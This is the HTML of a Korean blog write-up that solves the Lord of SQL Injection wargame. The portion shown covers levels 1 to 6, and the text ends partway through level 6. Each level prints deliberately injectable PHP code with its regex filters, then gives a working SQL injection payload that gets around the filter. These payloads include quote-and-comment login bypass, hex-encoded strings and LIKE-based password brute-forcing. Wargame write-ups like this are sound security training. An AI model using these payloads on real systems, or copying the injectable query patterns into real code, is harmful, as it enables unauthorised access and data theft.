<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="The Lord of the SQLI : The Fellowship of the SQLI, 2019   https:&#x2F;&#x2F;los.rubiya.kr&#x2F;   1정도원(rubiya) 님이 운영하시는 LOS 워게임의 문제 풀이입니다.  1. gremlin123456789101112&lt;?php  include &quot;.&#x2F;config.php&quot;;  logi"><meta property="og:type" content="article"><meta property="og:title" content="Lord of SQL Injection(LOS) Complete Solution"><meta property="og:url" content="https://blog.p6.is/los-solution/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="The Lord of the SQLI : The Fellowship of the SQLI, 2019   https:&#x2F;&#x2F;los.rubiya.kr&#x2F;   1정도원(rubiya) 님이 운영하시는 LOS 워게임의 문제 풀이입니다.  1. gremlin123456789101112&lt;?php  include &quot;.&#x2F;config.php&quot;;  logi"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2019-05-26T00:00:00.000Z"><meta property="article:modified_time" content="2022-10-14T13:04:25.645Z"><meta property="article:author" content="posix"><meta property="article:tag" content="SQLi"><meta name="twitter:card" content="summary"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Lord of SQL Injection(LOS) Complete Solution</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/bsides-delhi-ctf-eval-me/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/xss-cheatsheet/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/los-solution/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/los-solution/&text=Lord of SQL Injection(LOS) Complete Solution"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-gremlin"><span class="toc-number">1.</span> <span class="toc-text">1. gremlin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cobolt"><span class="toc-number">2.</span> <span class="toc-text">2. cobolt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-goblin"><span class="toc-number">3.</span> <span class="toc-text">3. goblin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-orc"><span class="toc-number">4.</span> <span class="toc-text">4. orc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-wolfman"><span class="toc-number">5.</span> <span class="toc-text">5. wolfman</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-darkelf"><span class="toc-number">6.</span> <span class="toc-text">6. darkelf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-orge"><span class="toc-number">7.</span> <span class="toc-text">7. orge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-troll"><span class="toc-number">8.</span> <span class="toc-text">8. troll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-vampire"><span class="toc-number">9.</span> <span class="toc-text">9. vampire</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-skeleton"><span class="toc-number">10.</span> <span class="toc-text">10. skeleton</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-golem"><span class="toc-number">11.</span> <span class="toc-text">11. golem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-darkknight"><span class="toc-number">12.</span> <span class="toc-text">12. darkknight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-bugbear"><span class="toc-number">13.</span> <span class="toc-text">13. bugbear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-giant"><span class="toc-number">14.</span> <span class="toc-text">14. giant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-assassin"><span class="toc-number">15.</span> <span class="toc-text">15. assassin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-zombie-assassin"><span class="toc-number">16.</span> <span class="toc-text">16. zombie_assassin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-succubus"><span class="toc-number">17.</span> <span class="toc-text">17. succubus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-nightmare"><span class="toc-number">18.</span> <span class="toc-text">18. nightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-xavis"><span class="toc-number">19.</span> <span class="toc-text">19. xavis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-dragon"><span class="toc-number">20.</span> <span class="toc-text">20. dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-iron-golem"><span class="toc-number">21.</span> <span class="toc-text">21. iron_golem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-dark-eyes"><span class="toc-number">22.</span> <span class="toc-text">22. dark_eyes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-hell-fire"><span class="toc-number">23.</span> <span class="toc-text">23. hell_fire</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-evil-wizard"><span class="toc-number">24.</span> <span class="toc-text">24. evil_wizard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-green-dragon"><span class="toc-number">25.</span> <span class="toc-text">25. green_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-red-dragon"><span class="toc-number">26.</span> <span class="toc-text">26. red_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-blue-dragon"><span class="toc-number">27.</span> <span class="toc-text">27. blue_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-frankenstein"><span class="toc-number">28.</span> <span class="toc-text">28. frankenstein</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-phantom"><span class="toc-number">29.</span> <span class="toc-text">29. phantom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30-ouroboros"><span class="toc-number">30.</span> <span class="toc-text">30. ouroboros</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#31-zombie"><span class="toc-number">31.</span> <span class="toc-text">31. zombie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-alien"><span class="toc-number">32.</span> <span class="toc-text">32. alien</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-cthulhu"><span class="toc-number">33.</span> <span class="toc-text">33. cthulhu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-death"><span class="toc-number">34.</span> <span class="toc-text">34. death</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-godzilla"><span class="toc-number">35.</span> <span class="toc-text">35. godzilla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-cyclops"><span class="toc-number">36.</span> <span class="toc-text">36. cyclops</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-chupacabra"><span class="toc-number">37.</span> <span class="toc-text">37. chupacabra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-manticore"><span class="toc-number">38.</span> <span class="toc-text">38. manticore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#39-banshee"><span class="toc-number">39.</span> <span class="toc-text">39. banshee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40-poltergeist"><span class="toc-number">40.</span> <span class="toc-text">40. poltergeist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41-nessie"><span class="toc-number">41.</span> <span class="toc-text">41. nessie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-revenant"><span class="toc-number">42.</span> <span class="toc-text">42. revenant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-yeti"><span class="toc-number">43.</span> <span class="toc-text">43. yeti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-mummy"><span class="toc-number">44.</span> <span class="toc-text">44. mummy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45-kraken"><span class="toc-number">45.</span> <span class="toc-text">45. kraken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46-cerberus"><span class="toc-number">46.</span> <span class="toc-text">46. cerberus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47-siren"><span class="toc-number">47.</span> <span class="toc-text">47. siren</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48-incubus"><span class="toc-number">48.</span> <span class="toc-text">48. incubus</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Lord of SQL Injection(LOS) Complete Solution</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2019-05-26T00:00:00.000Z" itemprop="datePublished">2019-05-26</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/writeup/">Writeup</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/SQLi/" rel="tag">SQLi</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><blockquote><p>The Lord of the SQLI : The Fellowship of the SQLI, 2019</p><p><a target="_blank" rel="noopener" href="https://los.rubiya.kr/">https://los.rubiya.kr/</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">정도원(rubiya) 님이 운영하시는 LOS 워게임의 문제 풀이입니다.</span><br></pre></td></tr></table></figure><h3 id="1-gremlin"><a href="#1-gremlin" class="headerlink" title="1. gremlin"></a>1. gremlin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;gremlin&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>최소한의 필터링만 적용된 기본형의 문제입니다.<br>싱글쿼트를 넣어주는 것으로 간단하게 우회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&#x27;||1#</span><br></pre></td></tr></table></figure><h3 id="2-cobolt"><a href="#2-cobolt" class="headerlink" title="2. cobolt"></a>2. cobolt</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;cobolt&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문항과 거의 다르지 않습니다.<br>싱글쿼트을 삽입하고 뒷부분을 한 줄 주석으로 처리해 주면 우회가 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=admin&#x27;#</span><br></pre></td></tr></table></figure><h3 id="3-goblin"><a href="#3-goblin" class="headerlink" title="3. goblin"></a>3. goblin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;goblin&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼트가 필터링 되어있어 통상적인 방법으로는 문자열을 삽입할 수 없지만<br>mysql 에서는 문자열을 16진수 형태의 hex 코드로 대체할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : no=0 union select 0x61646d696e</span><br></pre></td></tr></table></figure><h3 id="4-orc"><a href="#4-orc" class="headerlink" title="4. orc"></a>4. orc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;orc&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>실제 패스워드를 알아내는 것이 문제의 목표입니다.<br>like 문을 사용하여 한글자씩 대입 해보면 답을 알 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : &#x27;||pw like &#x27;BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="5-wolfman"><a href="#5-wolfman" class="headerlink" title="5. wolfman"></a>5. wolfman</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>(); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No whitespace ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;wolfman&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>whitespace를 차단한다고 나와있지만 실제로는 Space(%20)만이 필터링 됩니다. mysql 에서는 Space(%20)를 제외하고도 %09, %0a, %0b, %0c, %0d, %2b, 괄호를 구분자로서 사용이 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;||1%09limit%091,1#</span><br></pre></td></tr></table></figure><h3 id="6-darkelf"><a href="#6-darkelf" class="headerlink" title="6. darkelf"></a>6. darkelf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>(); </span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();  </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;darkelf&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼트 삽입으로 로그인을 우회할 수 있지만<br>guest 계정이 상위에 위치하고 있기에 조건문을 조작하거나<br>limit, order by 등을 사용해 주어야 합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw=&#x27;||id=&#x27;admin&#x27;#</span><br><span class="line">Solution2 : pw=&#x27;||1 limit 